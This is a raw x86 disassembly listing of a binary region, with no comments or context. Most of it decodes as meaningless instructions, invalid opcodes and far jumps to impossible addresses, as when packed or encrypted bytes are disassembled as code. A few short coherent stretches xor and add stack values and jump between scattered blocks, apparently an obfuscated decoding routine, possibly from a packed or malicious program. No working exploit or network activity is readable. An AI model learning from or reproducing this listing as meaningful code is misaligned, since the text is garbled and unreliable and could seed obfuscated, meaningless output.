  40fe48:	retf   0x2d9
  40fe4b:	mov    dl,0xf1
  40fe4d:	or     bh,ch
  40fe4f:	mov    eax,0x2770218f
  40fe54:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fe55:	rcr    BYTE PTR [esi+0x78],cl
  40fe58:	mov    ebx,0x4670de06
  40fe5d:	add    edx,ebx
  40fe5f:	jmp    0xe23292bb
  40fe64:	add    DWORD PTR [ecx-0x349feea1],edx
  40fe6a:	mov    BYTE PTR [edi-0x34],dh
  40fe6d:	add    ah,dh
  40fe6f:	loopne 0x40fdfa
  40fe71:	xchg   DWORD PTR [ebx],eax
  40fe73:	xchg   DWORD PTR [esi-0x45],eax
  40fe76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fe77:	pop    esi
  40fe78:	push   ss
  40fe79:	popf   
  40fe7a:	pop    es
  40fe7b:	out    dx,eax
  40fe7c:	pop    edi
  40fe7d:	loopne 0x40feb6
  40fe7f:	cmc    
  40fe80:	mov    ebp,0x4e1b4ba1
  40fe85:	out    dx,al
  40fe86:	jns    0x40feb2
  40fe88:	or     al,0x3c
  40fe8a:	scas   eax,DWORD PTR es:[edi]
  40fe8b:	sbb    DWORD PTR [ecx-0x28],ebp
  40fe8e:	jle    0x40fefc
  40fe90:	cs out dx,eax
  40fe92:	out    0x4d,eax
  40fe94:	mov    esi,0xe8ed350f
  40fe99:	sbb    ebp,ebx
  40fe9b:	sbb    eax,DWORD PTR ds:0x64059c8e
  40fea1:	adc    DWORD PTR [esi+0x79],0x3811340c
  40fea8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fea9:	int    0xd0
  40feab:	or     BYTE PTR [ebp-0x75],cl
  40feae:	mov    ds:0xaf07dc11,al
  40feb3:	mov    ds:0xae14cc3d,eax
  40feb8:	in     eax,dx
  40feb9:	jmp    0xc70b4a7b
  40febe:	mov    ds:0xcccb7675,eax
  40fec3:	mov    al,0x71
  40fec5:	pop    ss
  40fec6:	mov    ecx,0x3a9bba3c
  40fecb:	adc    eax,0xec598c39
  40fed0:	jg     0x40ff02
  40fed2:	inc    edx
  40fed3:	xchg   BYTE PTR [ecx],ch
  40fed5:	loopne 0x40ff04
  40fed7:	jmp    0x30e99c77
  40fedc:	loope  0x40ff43
  40fede:	mov    edi,DWORD PTR [esi+0x26856632]
  40fee4:	shl    DWORD PTR [ecx+eax*1],cl
  40fee7:	loopne 0x40fee8
  40fee9:	xlat   BYTE PTR ds:[ebx]
  40feea:	lods   al,BYTE PTR ds:[esi]
  40feeb:	inc    ebx
  40feec:	mov    eax,0xca105fad
  40fef1:	jg     0x40ff29
  40fef3:	jnp    0x40fed9
  40fef5:	dec    ecx
  40fef6:	xor    esi,DWORD PTR [esi]
  40fef8:	ficomp WORD PTR [ebx+0x21]
  40fefb:	inc    edi
  40fefc:	or     DWORD PTR [ebx-0xf],esi
  40feff:	inc    edx
  40ff00:	pushf  
  40ff01:	jecxz  0x40fe8d
  40ff03:	push   eax
  40ff04:	nop
  40ff05:	stos   DWORD PTR es:[edi],eax
  40ff06:	pop    ebx
  40ff07:	sbb    BYTE PTR [edx],bh
  40ff09:	jecxz  0x40fee8
  40ff0b:	leave  
  40ff0c:	mov    ch,0x74
  40ff0e:	aas    
  40ff0f:	(bad)  
  40ff10:	clc    
  40ff11:	sbb    al,0xbf
  40ff13:	fidivr DWORD PTR [edi+0x40]
  40ff16:	jge    0x40ff35
  40ff18:	enter  0x296a,0xb
  40ff1c:	jmp    0xbaa2:0xf63be21b
  40ff23:	cli    
  40ff24:	(bad)  
  40ff25:	imul   edi,DWORD PTR [eax+0x3fc2e407],0x5d
  40ff2c:	sbb    bl,BYTE PTR [esp+ebx*1]
  40ff2f:	pop    ebp
  40ff30:	aad    0x40
  40ff32:	mov    ds:0x90fee34d,al
  40ff37:	sbb    eax,eax
  40ff39:	pop    ss
  40ff3a:	ss es scas eax,DWORD PTR es:[edi]
  40ff3d:	mov    ch,0xf1
  40ff3f:	ss sub esi,eax
  40ff42:	fnstsw WORD PTR [ebx]
  40ff44:	push   edi
  40ff45:	mov    ecx,0xc758802a
  40ff4a:	div    esi
  40ff4c:	sbb    bh,bh
  40ff4e:	cli    
  40ff4f:	test   DWORD PTR [edx-0x75],ebp
  40ff52:	mov    WORD PTR [edx-0x16f86ad5],ds
  40ff58:	and    DWORD PTR [esi+0x41],ecx
  40ff5b:	fwait
  40ff5c:	xor    al,BYTE PTR [esi-0x58f6916c]
  40ff62:	and    BYTE PTR [edi-0x1c],al
  40ff65:	xchg   esi,eax
  40ff66:	retf   
  40ff67:	sub    ah,cl
  40ff69:	sub    DWORD PTR [ecx],eax
  40ff6b:	mov    ah,0x69
  40ff6d:	and    ebx,edi
  40ff6f:	and    esp,DWORD PTR [edi]
  40ff71:	adc    dl,BYTE PTR [eax+0x91dc3be]
  40ff77:	xchg   esp,eax
  40ff78:	cwde   
  40ff79:	xchg   ecx,eax
  40ff7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ff7b:	(bad)  
  40ff7d:	(bad)  
  40ff7e:	jnp    0x40ff7e
  40ff80:	es push esi
  40ff82:	xchg   DWORD PTR ds:0x45e3bcd0,esp
  40ff88:	shl    ebp,cl
  40ff8a:	add    BYTE PTR [ebp+0x3bb77e9a],ah
  40ff90:	cmp    BYTE PTR [bx+di],bh
  40ff93:	mov    dh,0xd0
  40ff95:	les    esi,FWORD PTR [edx+0x3f992385]
  40ff9b:	dec    esi
  40ff9c:	adc    al,BYTE PTR ds:0x7ed69fd4
  40ffa2:	imul   eax,DWORD PTR [ebp+0x6],0x8cd1c502
  40ffa9:	test   al,0x43
  40ffab:	sbb    al,BYTE PTR [edx-0x78]
  40ffae:	pop    ecx
  40ffaf:	(bad)  
  40ffb0:	dec    ebx
  40ffb1:	and    dh,BYTE PTR [eax-0x1ab883f3]
  40ffb7:	jnp    0x40ff3e
  40ffb9:	sub    eax,0xea8a5fdc
  40ffbe:	mov    ds:0xb9bc3637,al
  40ffc3:	xchg   esp,eax
  40ffc4:	adc    edx,DWORD PTR [ecx-0x7d]
  40ffc7:	adc    eax,0xc6f2cc1a
  40ffcc:	and    eax,0x3e9730da
  40ffd1:	sbb    eax,DWORD PTR [eax*8-0x3e9cb7d5]
  40ffd8:	dec    eax
  40ffd9:	jo     0x40fffd
  40ffdb:	out    dx,al
  40ffdc:	fs std 
  40ffde:	xor    eax,0x5066d53c
  40ffe3:	sub    edi,esp
  40ffe5:	fdivr  st,st(6)
  40ffe7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ffe8:	mov    ch,0x31
  40ffea:	mov    ds:0xf7c92769,eax
  40ffef:	sub    al,0x26
  40fff1:	int    0x41
  40fff3:	je     0x40ffb4
  40fff5:	xchg   ebp,eax
  40fff6:	mov    DWORD PTR [edi+eiz*4+0x4a],eax
  40fffa:	cld    
  40fffb:	addr16 aam 0xbb
  40fffe:	arpl   WORD PTR [edi+0x466b7094],sp
  410004:	shl    BYTE PTR [eax],0xf6
  410007:	dec    esi
  410008:	(bad)  
  41000a:	dec    ebp
  41000b:	ror    DWORD PTR [ecx],cl
  41000d:	inc    ebx
  41000e:	and    BYTE PTR [edx+0x437bdafa],al
  410014:	mov    bh,0x7e
  410016:	(bad)  
  410018:	xor    eax,DWORD PTR [eax]
  41001a:	fbld   TBYTE PTR [eax+0x4a]
  41001d:	lods   eax,DWORD PTR ds:[esi]
  41001e:	psadbw mm7,QWORD PTR [esi+edi*8+0x2931d90d]
  410026:	std    
  410027:	fs push 0xa
  41002a:	and    ebp,ebp
  41002c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41002d:	xchg   ebx,eax
  41002e:	sub    BYTE PTR [esi],dh
  410030:	push   esi
  410031:	xchg   ebx,eax
  410032:	mov    ebx,DWORD PTR [ebp-0x10]
  410035:	sub    ebx,edi
  410037:	cmp    ebx,edx
  410039:	ja     0x41004b
  41003f:	mov    edx,DWORD PTR [ebp-0x4]
  410042:	xor    edx,eax
  410044:	add    edx,ecx
  410046:	jmp    0x41220c
  41004b:	mov    edx,DWORD PTR [ebp-0x2c]
  41004e:	mov    edi,DWORD PTR [ebp-0x4]
  410051:	xor    edx,eax
  410053:	xor    edi,eax
  410055:	add    edi,ecx
  410057:	jmp    0x4102df
  41005c:	sar    DWORD PTR [eax+edx*8],cl
  41005f:	int    0xd7
  410061:	(bad)  
  410063:	ret    0x69c5
  410066:	xchg   ebx,eax
  410067:	daa    
  410068:	mov    ebx,0xe7c98c0e
  41006d:	dec    eax
  41006e:	js     0x4100e8
  410070:	in     eax,0x7e
  410072:	js     0x4100ec
  410074:	js     0x410090
  410076:	push   ebx
  410077:	xor    al,0xc
  410079:	dec    esp
  41007a:	(bad)  
  41007b:	sbb    eax,0x7b4f7475
  410080:	or     eax,0x1cfa64cf
  410085:	pop    ebp
  410086:	shl    BYTE PTR [esi+0x5c8b507c],cl
  41008c:	test   DWORD PTR [esi+0x11],esi
  41008f:	ins    DWORD PTR es:[edi],dx
  410090:	or     DWORD PTR [edi],0x740508bf
  410096:	pop    ebp
  410097:	retf   0x33e8
  41009a:	dec    ebp
  41009b:	loop   0x4100b0
  41009d:	push   ecx
  41009e:	in     eax,0x58
  4100a0:	adc    al,0x44
  4100a2:	stos   BYTE PTR es:[edi],al
  4100a3:	xchg   DWORD PTR ds:0x9161dc68,edi
  4100a9:	mov    bh,0xca
  4100ab:	test   BYTE PTR [ebx-0x1d],0x14
  4100af:	mov    esi,0x3e6cfa15
  4100b4:	enter  0x90f0,0xc7
  4100b8:	arpl   WORD PTR [eax],dx
  4100ba:	call   0x2d07:0xa88b22d
  4100c1:	sub    ebp,DWORD PTR [esi]
  4100c3:	xor    BYTE PTR [ebp+ecx*1-0x73],bl
  4100c7:	test   DWORD PTR [edi],eax
  4100c9:	sbb    ah,ch
  4100cb:	fwait
  4100cc:	push   0x248b0a53
  4100d1:	cmp    esp,DWORD PTR [ebp-0x6ee5a6d5]
  4100d7:	repnz add DWORD PTR [edx],0xffffffc3
  4100db:	cld    
  4100dc:	std    
  4100dd:	cmp    dl,ch
  4100df:	push   eax
  4100e0:	mov    dh,0x8b
  4100e2:	add    edi,0x1d
  4100e5:	push   ebp
  4100e6:	mov    ds:0x4eb47616,eax
  4100eb:	ss push ds
  4100ed:	outs   dx,BYTE PTR ds:[esi]
  4100ee:	scas   al,BYTE PTR es:[di]
  4100f0:	fnstsw WORD PTR [ebx-0x5]
  4100f3:	(bad)  
  4100f4:	in     al,0xcb
  4100f6:	int3   
  4100f7:	adc    edx,DWORD PTR [esp+ecx*8-0x17614a9]
  4100fe:	adc    al,0x11
  410100:	loopne 0x410106
  410102:	fwait
  410103:	std    
  410104:	fisttp WORD PTR [edi+0x11754c50]
  41010a:	add    edx,eax
  41010c:	mov    ebx,0xf0adc05c
  410111:	sar    BYTE PTR [eax+0x6e0ba331],1
  410117:	xchg   esp,eax
  410118:	outs   dx,BYTE PTR ds:[esi]
  410119:	ins    BYTE PTR es:[edi],dx
  41011a:	sbb    DWORD PTR [edx],ebp
  41011c:	stc    
  41011d:	cmp    ebx,DWORD PTR [ebx+0x2a8d45e5]
  410123:	mov    ebx,0xe53b369b
  410128:	nop
  410129:	jns    0x410125
  41012b:	pop    es
  41012c:	sbb    BYTE PTR [eax+0xfa917df],al
  410132:	mov    eax,ds:0x77b4043e
  410137:	pushf  
  410138:	and    al,0x99
  41013a:	mov    ebx,0x413c169a
  41013f:	xchg   esp,eax
  410140:	lods   eax,DWORD PTR ds:[esi]
  410141:	mov    eax,0xd950b025
  410146:	je     0x4100e7
  410148:	inc    edi
  410149:	mov    bl,0x15
  41014b:	aam    0xaa
  41014d:	xor    cl,BYTE PTR [edx+eax*2-0x4361960f]
  410154:	aaa    
  410155:	dec    ecx
  410156:	imul   edx,DWORD PTR ds:0x16cc176d,0xd9a9d256
  410160:	jbe    0x4101ce
  410162:	xlat   BYTE PTR ds:[ebx]
  410163:	sbb    eax,0x4001a1f1
  410168:	addr16 pop es
  41016a:	sahf   
  41016b:	xchg   ebx,eax
  41016c:	adc    eax,0x4808004
  410171:	pop    es
  410172:	jo     0x410160
  410174:	push   esi
  410175:	not    DWORD PTR [ebp-0x46]
  410178:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410179:	xlat   BYTE PTR ds:[ebx]
  41017a:	add    DWORD PTR [eax+0x72a91337],esp
  410180:	push   cs
  410181:	adc    eax,0x5fc96b51
  410186:	xchg   DWORD PTR [edi+edi*1],edi
  410189:	cmp    ebx,DWORD PTR [esi+0x264c91e1]
  41018f:	jge    0x410197
  410191:	mov    bh,0x30
  410193:	mov    ah,0x85
  410195:	and    al,0x78
  410197:	dec    ebp
  410198:	lock inc esi
  41019a:	addr16 retf 
  41019c:	xchg   DWORD PTR [ebp+0x43],edi
  41019f:	ror    bl,1
  4101a1:	(bad)  
  4101a2:	and    DWORD PTR [ebx],0x1ba957f0
  4101a8:	adc    BYTE PTR [ebx-0x17],bl
  4101ab:	aam    0xbe
  4101ad:	mov    DWORD PTR [edx],eax
  4101af:	scas   al,BYTE PTR es:[edi]
  4101b0:	adc    ecx,DWORD PTR [edx+0x60254aa]
  4101b6:	inc    edi
  4101b7:	or     bh,dl
  4101b9:	in     eax,dx
  4101ba:	or     BYTE PTR [ebp+eax*4-0x62bf7c5],dh
  4101c1:	mov    cl,0xaa
  4101c3:	mov    cl,0x94
  4101c5:	dec    esp
  4101c6:	adc    eax,0xa956f6c2
  4101cb:	rol    DWORD PTR [ebx+ebp*4-0x2e],1
  4101cf:	sbb    BYTE PTR [edx+0x6d],dh
  4101d2:	xlat   BYTE PTR ds:[ebx]
  4101d3:	jg     0x4101a7
  4101d5:	mov    ebp,0xc435c39a
  4101da:	dec    edx
  4101db:	jmp    0x3c21:0x86732d21
  4101e2:	xchg   ebp,eax
  4101e3:	(bad)  
  4101e4:	xor    ah,bl
  4101e6:	push   es
  4101e7:	shl    BYTE PTR [eax+edi*4],cl
  4101ea:	fild   DWORD PTR [eax]
  4101ec:	enter  0xab2f,0x8f
  4101f0:	aaa    
  4101f1:	xor    BYTE PTR [ebx-0x5d],ah
  4101f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4101f5:	adc    edi,edi
  4101f7:	fisttp DWORD PTR [edx+ebp*2]
  4101fa:	add    BYTE PTR [esi+0x45e01ef4],cl
  410200:	hlt    
  410201:	test   al,0xf2
  410203:	fmul   QWORD PTR [ebp-0x4879d3d1]
  410209:	mov    dh,0xd1
  41020b:	fisubr DWORD PTR [ecx]
  41020d:	dec    edx
  41020e:	push   esi
  41020f:	xchg   DWORD PTR [edi-0x4cbde24d],esp
  410215:	dec    edi
  410216:	mov    ebx,0xece29751
  41021b:	les    esp,FWORD PTR [ebx+0x4f8e697e]
  410221:	add    DWORD PTR [eax-0x12964164],0x70c38e9
  41022b:	rcr    DWORD PTR ds:0xba329eb7,cl
  410231:	into   
  410232:	cmp    DWORD PTR [eax],edi
  410234:	loopne 0x4101f5
  410236:	sbb    eax,0x3f4b2207
  41023b:	mov    bl,0x88
  41023d:	gs ins BYTE PTR es:[edi],dx
  41023f:	and    ebx,DWORD PTR [esi]
  410241:	leave  
  410242:	lods   al,BYTE PTR ds:[esi]
  410243:	mov    dl,0xac
  410245:	test   DWORD PTR [edx-0x7fe74fb7],0x48bcc256
  41024f:	mov    ebx,esp
  410251:	sbb    DWORD PTR [ebp+eiz*2+0x59],ebx
  410255:	(bad)  [ebx-0x21]
  410258:	enter  0x3bf1,0xfd
  41025c:	mov    DWORD PTR [esi+0x39ae9c19],edx
  410262:	in     eax,dx
  410263:	pop    esi
  410264:	lods   eax,DWORD PTR ds:[esi]
  410265:	iret   
  410266:	arpl   WORD PTR ss:[eax+0x4b2d9fdb],dx
  41026d:	cld    
  41026e:	push   ecx
  41026f:	cmp    eax,0xd3c0c0e5
  410274:	lahf   
  410275:	add    DWORD PTR [edx-0x67],esp
  410278:	hlt    
  410279:	std    
  41027a:	sbb    eax,0xa135686
  41027f:	test   al,0x7a
  410281:	enter  0x2d91,0xbf
  410285:	sub    eax,0x21abc3a7
  41028a:	(bad)  
  41028c:	fst    DWORD PTR [ecx+0x7e]
  41028f:	mov    esi,0x2681e6ef
  410294:	xor    eax,0x1f74338a
  410299:	popf   
  41029a:	sar    BYTE PTR [esi+ebp*1-0x50],1
  41029e:	mov    bh,0x61
  4102a0:	lea    edx,[eax-0x38e9ae36]
  4102a6:	mov    edi,0x5b858972
  4102ab:	jl     0x41024d
  4102ad:	push   ebx
  4102ae:	dec    edi
  4102af:	aaa    
  4102b0:	jle    0x41026d
  4102b2:	dec    esi
  4102b3:	and    ch,BYTE PTR [ebp-0x67]
  4102b6:	pop    ecx
  4102b7:	cmc    
  4102b8:	dec    edx
  4102b9:	int    0xd2
  4102bb:	fidiv  WORD PTR ds:0x9514834a
  4102c1:	fisttp QWORD PTR [esp+ebp*8+0xd4f29c3]
  4102c8:	mov    ebp,DWORD PTR [ecx+0x7a]
  4102cb:	idiv   BYTE PTR [edx+0x7a]
  4102ce:	clc    
  4102cf:	push   0xf53a9e61
  4102d4:	or     esp,DWORD PTR [ebx+edx*1+0x2f]
  4102d8:	mov    al,ds:0xea38730e
  4102dd:	lahf   
  4102de:	daa    
  4102df:	add    edx,ecx
  4102e1:	jmp    0x410569
  4102e6:	ret    
  4102e7:	int    0xc7
  4102e9:	into   
  4102ea:	(bad)  
  4102ec:	(bad)  
  4102ee:	xchg   BYTE PTR [edi],dh
  4102f0:	jle    0x410290
  4102f2:	dec    ecx
  4102f3:	xchg   esi,eax
  4102f4:	stos   BYTE PTR es:[edi],al
  4102f5:	js     0x410343
  4102f7:	dec    esi
  4102f8:	js     0x410372
  4102fa:	in     eax,0x7e
  4102fc:	js     0x410376
  4102fe:	loope  0x410297
  410300:	aaa    
  410301:	push   ebx
  410302:	icebp  
  410303:	retf   0xdb57
  410306:	clc    
  410307:	push   0xffffff92
  410309:	xor    al,0xf6
  41030b:	sbb    edi,edi
  41030d:	cmp    dl,BYTE PTR [ecx-0x391e7ac0]
  410313:	or     DWORD PTR [esi],edi
  410315:	fs mov dl,0x6e
  410318:	adc    al,0x2a
  41031a:	sbb    al,0x95
  41031c:	xchg   edx,eax
  41031d:	test   al,0x8c
  41031f:	inc    ebx
  410320:	arpl   WORD PTR [edi],dx
  410322:	loopne 0x4102af
  410324:	mov    es:0x9e6cda83,al
  41032a:	pop    ss
  41032b:	mov    ecx,ds
  41032d:	out    dx,eax
  41032e:	cmp    al,0x4d
  410330:	pcmpgtb mm7,QWORD PTR [ecx-0x6567e612]
  410337:	cmc    
  410338:	test   DWORD PTR [eax+0x7c2c0b63],esi
  41033e:	xchg   ecx,eax
  41033f:	inc    esi
  410340:	test   DWORD PTR ds:0x9b60197f,edi
  410346:	(bad)  
  410347:	pop    edi
  410348:	jno    0x410327
  41034a:	nop
  41034b:	xor    DWORD PTR [ebx-0x13f32b60],ecx
  410351:	pop    es
  410352:	adc    al,BYTE PTR [eax]
  410354:	js     0x41034c
  410356:	dec    eax
  410357:	fdivrp st(5),st
  410359:	mov    esi,0xa2e59854
  41035e:	(bad)  
  41035f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410360:	add    cl,bh
  410362:	mov    ah,0x51
  410364:	aas    
  410365:	stos   DWORD PTR es:[edi],eax
  410366:	(bad)  
  410367:	sar    BYTE PTR [ebx],0xde
  41036a:	pop    ds
  41036b:	and    bh,BYTE PTR [edx+edi*1]
  41036e:	sahf   
  41036f:	or     eax,0xbfe77945
  410374:	jne    0x4103d1
  410376:	sbb    al,0xb
  410378:	mov    esp,0x673ddfd3
  41037d:	dec    ebx
  41037e:	mov    ch,0x11
  410380:	sbb    eax,0x656c747f
  410385:	es ret 0x48c3
  410389:	mov    ds,WORD PTR [ebx-0x3e61e19d]
  41038f:	call   0x7e91f51c
  410394:	push   ebp
  410395:	dec    edi
  410396:	jne    0x4103e7
  410398:	or     al,0x91
  41039a:	and    eax,0x4b2c4b37
  41039f:	cmp    ah,BYTE PTR [ecx+ebx*4+0x5f]
  4103a3:	sbb    BYTE PTR [eax+0x68f4edf1],0x6c
  4103aa:	jge    0x410428
  4103ac:	daa    
  4103ad:	aaa    
  4103ae:	mov    ah,0xbc
  4103b0:	int    0xd1
  4103b2:	shl    ebp,1
  4103b4:	push   esp
  4103b5:	inc    ebx
  4103b6:	in     al,dx
  4103b7:	push   ss
  4103b8:	into   
  4103b9:	cwde   
  4103ba:	outs   dx,DWORD PTR ds:[esi]
  4103bb:	push   edx
  4103bc:	dec    ebx
  4103bd:	in     al,0xdd
  4103bf:	xor    eax,0x2d61dda
  4103c4:	pop    edi
  4103c5:	xchg   DWORD PTR [ebp+0x3e],ebx
  4103c8:	shl    DWORD PTR [ecx],1
  4103ca:	jmp    0x4cf7:0x23f3e1fd
  4103d1:	aaa    
  4103d2:	aaa    
  4103d3:	lea    edi,[ebp-0x4426448d]
  4103d9:	mov    WORD PTR [edx+ebx*2],cs
  4103dc:	or     BYTE PTR [ecx-0x79bab873],0x99
  4103e3:	jle    0x4103de
  4103e5:	sbb    esp,DWORD PTR [eax]
  4103e7:	dec    esi
  4103e8:	pop    ebx
  4103e9:	cmp    dl,ch
  4103eb:	cmp    DWORD PTR [edi+0x70],eax
  4103ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4103ef:	aaa    
  4103f0:	sub    BYTE PTR [ebp+0x20],bl
  4103f3:	xchg   ebx,eax
  4103f4:	jge    0x4103c0
  4103f6:	ret    0xe5bc
  4103f9:	leave  
  4103fa:	push   ecx
  4103fb:	pop    esp
  4103fc:	xor    BYTE PTR [ebx+0x4058d911],bh
  410402:	test   ecx,ecx
  410404:	pop    edi
  410405:	pop    ds
  410406:	pop    ebp
  410407:	jecxz  0x410476
  410409:	push   esi
  41040a:	inc    ecx
  41040b:	dec    ebx
  41040c:	(bad)  
  41040d:	iret   
  41040e:	add    ecx,ebp
  410410:	xor    BYTE PTR [edx],dl
  410412:	sub    ebp,ebx
  410414:	mov    ebx,0xe96c79f1
  410419:	xor    ah,BYTE PTR [edi+edx*2]
  41041c:	dec    ebp
  41041d:	test   ebx,ecx
  41041f:	(bad)  
  410420:	enter  0x18d,0x46
  410424:	daa    
  410425:	repnz push cs
  410427:	leave  
  410428:	fcom   QWORD PTR [edx+0x1b]
  41042b:	add    al,0x7e
  41042d:	out    0x2b,eax
  41042f:	shl    BYTE PTR [eax+ebp*4-0x5e],0xb4
  410434:	sub    DWORD PTR [edi+0x3be44320],edi
  41043a:	cmc    
  41043b:	ficomp WORD PTR [ebx+edx*4+0x19]
  41043f:	loop   0x410465
  410441:	jmp    0x410434
  410443:	and    eax,0x86946e1
  410448:	adc    eax,DWORD PTR ds:0x538c94d
  41044e:	and    dh,ah
  410450:	dec    ebp
  410451:	xor    eax,0xbe206c2c
  410456:	ret    0xd5f
  410459:	fs pusha 
  41045b:	cmp    BYTE PTR [edx+0x20],dl
  41045e:	sysret 
  410460:	push   0xffffffea
  410462:	mov    dl,0x19
  410464:	cmp    DWORD PTR [esi+0x1dfd7d54],0xffffffa2
  41046b:	fisubr DWORD PTR [edx]
  41046d:	ss pop edx
  41046f:	in     al,dx
  410470:	push   ebx
  410471:	mov    ebx,0xb15dc3d5
  410476:	mov    ecx,0xc5d67567
  41047b:	mov    esi,0xab176585
  410480:	leave  
  410481:	pop    ds
  410482:	sub    eax,0xf4bd35f
  410487:	and    DWORD PTR [esi+0x48],ebx
  41048a:	fisub  WORD PTR [ebx+0xa69eda2]
  410490:	sub    BYTE PTR [ebx+esi*2-0x3d],0x4c
  410495:	push   edi
  410496:	fstp   st(4)
  410498:	inc    esp
  410499:	(bad)
  41049c:	pop    edi
  41049d:	mov    esp,0x81e81653
  4104a2:	lock ds jl 0x41043f
  4104a6:	loop   0x4104fb
  4104a8:	pop    edx
  4104a9:	pop    ecx
  4104aa:	les    edi,FWORD PTR [ecx-0x7a3ca03c]
  4104b0:	jmp    0x4104a1
  4104b2:	add    BYTE PTR [esi],bl
  4104b4:	lea    edx,[edi+edi*4-0x1b]
  4104b8:	aaa    
  4104b9:	sbb    BYTE PTR ds:0x5e31a0d,bh
  4104bf:	jno    0x4104e5
  4104c1:	fcom   QWORD PTR [ebx+0x1b7a2c01]
  4104c7:	lea    esp,[edi]
  4104c9:	mov    ebx,0x11cfbfbf
  4104ce:	in     al,0x55
  4104d0:	outs   dx,DWORD PTR ds:[esi]
  4104d1:	inc    esi
  4104d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4104d3:	sub    edi,DWORD PTR [ebx+0x26c6954b]
  4104d9:	and    BYTE PTR [edx+0x76],dl
  4104dc:	(bad)  
  4104dd:	sub    eax,0x26da2755
  4104e2:	xor    BYTE PTR [edi],bl
  4104e4:	sbb    eax,0xed75d5cb
  4104e9:	std    
  4104ea:	jg     0x41047d
  4104ec:	pop    esp
  4104ed:	inc    ebx
  4104ee:	xchg   esp,eax
  4104ef:	sbb    al,0x4c
  4104f1:	cmp    ax,WORD PTR [ebx-0x74d62d6a]
  4104f8:	sub    DWORD PTR [edx],0x5b
  4104fb:	push   ecx
  4104fc:	pop    ss
  4104fd:	xchg   esp,eax
  4104fe:	cmp    esp,esp
  410500:	push   ss
  410501:	rol    BYTE PTR [esi],cl
  410503:	pusha  
  410504:	mov    esp,0xafc525c0
  410509:	mov    al,0x63
  41050c:	aam    0x86
  41050e:	or     DWORD PTR [ecx-0x35],ecx
  410511:	jmp    0x4104f2
  410513:	addr16 sub al,0x4
  410516:	or     eax,0x55e621b1
  41051b:	pop    eax
  41051c:	or     eax,0x242e17da
  410521:	scas   al,BYTE PTR es:[edi]
  410522:	mov    ecx,0xe5a5506d
  410527:	test   eax,0xb9a64e67
  41052c:	call   0x93b849ce
  410531:	xchg   esp,eax
  410532:	stos   DWORD PTR es:[edi],eax
  410533:	inc    eax
  410534:	(bad)  
  410536:	pushf  
  410537:	lods   eax,DWORD PTR ds:[esi]
  410538:	cmc    
  410539:	mov    ah,0x66
  41053b:	mov    bh,0x13
  41053d:	(bad)  
  41053e:	fnstenv [ecx]
  410540:	pop    eax
  410541:	adc    DWORD PTR [edx-0x3eda9748],esi
  410547:	xlat   BYTE PTR ds:[ebx]
  410548:	dec    eax
  410549:	xor    ebx,edx
  41054b:	xchg   esp,eax
  41054c:	cs aaa 
  41054e:	hlt    
  41054f:	pop    esi
  410550:	add    al,0xf9
  410552:	mov    WORD PTR [edi+0x4],cs
  410555:	outs   dx,BYTE PTR ds:[esi]
  410556:	scas   eax,DWORD PTR es:[edi]
  410557:	mov    edi,0x3b7d3cb0
  41055c:	or     eax,0xdd49a4fe
  410561:	in     eax,0x7b
  410563:	add    eax,0x47188fbe
  410568:	iret   
  410569:	imul   edx,edi
  41056c:	mov    edi,DWORD PTR [ebp-0x8]
  41056f:	mov    ebx,DWORD PTR [ebp-0x10]
  410572:	jmp    0x4107fa
  410577:	cmp    al,0xd6
  410579:	ret    0xdac3
  41057c:	fcmovnb st,st(1)
  41057e:	aad    0xe1
  410580:	pop    es
  410581:	adc    ah,BYTE PTR [ecx]
  410583:	mov    ds:0x3921de24,eax
  410588:	push   ebx
  410589:	js     0x410603
  41058b:	in     eax,0x7e
  41058d:	js     0x410607
  41058f:	(bad)  
  410590:	icebp  
  410591:	mov    esi,0x10454710
  410596:	mov    bl,0xf9
  410598:	mov    esi,0x96e1e4a5
  41059d:	and    al,BYTE PTR [ebp+0x29]
  4105a0:	xrelease xchg DWORD PTR [edi-0x3dc3e322],esi
  4105a7:	xadd   DWORD PTR [ebx-0x5b6d5363],esi
  4105ae:	aam    0x20
  4105b0:	jne    0x4105c4
  4105b2:	jmp    0x410551
  4105b4:	sti    
  4105b5:	pushf  
  4105b6:	lock dec eax
  4105b8:	xlat   BYTE PTR ds:[ebx]
  4105b9:	xchg   ebx,eax
  4105ba:	sub    DWORD PTR [ebx+eax*2-0x7a3ffa16],edi
  4105c1:	xchg   DWORD PTR [esi],ecx
  4105c3:	addr16 xor al,0xab
  4105c6:	jb     0x410621
  4105c8:	or     edi,ebx
  4105ca:	in     al,0xdf
  4105cc:	(bad)  
  4105cd:	cmp    edi,edi
  4105cf:	jo     0x41063a
  4105d1:	jl     0x410570
  4105d3:	pop    edx
  4105d4:	or     al,BYTE PTR [esi-0x6d]
  4105d7:	push   ebp
  4105d8:	popa   
  4105d9:	cmc    
  4105da:	out    dx,al
  4105db:	sti    
  4105dc:	mov    ecx,0x2d3c012c
  4105e1:	rcl    BYTE PTR [edi-0x3aef37a0],1
  4105e7:	in     eax,dx
  4105e8:	repz test bl,0x1f
  4105ec:	and    DWORD PTR [edi+eiz*4+0x3c5332f0],esp
  4105f3:	out    dx,al
  4105f4:	sahf   
  4105f5:	stos   BYTE PTR es:[edi],al
  4105f6:	test   eax,0x733ab030
  4105fb:	fs push 0xffffffe2
  4105fe:	aaa    
  4105ff:	push   ebx
  410600:	sbb    BYTE PTR [edi],ch
  410602:	xchg   ebx,eax
  410603:	into   
  410604:	sbb    BYTE PTR [eax],bh
  410606:	mov    ds,ebp
  410608:	lds    ecx,FWORD PTR [eax-0x4eb53d17]
  41060e:	pushf  
  41060f:	pop    esi
  410610:	mov    dh,0xde
  410612:	in     eax,0xd3
  410614:	dec    edi
  410615:	mov    esp,0x6817e548
  41061a:	sahf   
  41061b:	push   ss
  41061c:	out    dx,al
  41061d:	jge    0xb929e295
  410623:	das    
  410624:	sar    DWORD PTR [ecx],0x76
  410627:	imul   BYTE PTR [esi]
  410629:	jl     0x410680
  41062b:	or     al,0xc7
  41062d:	into   
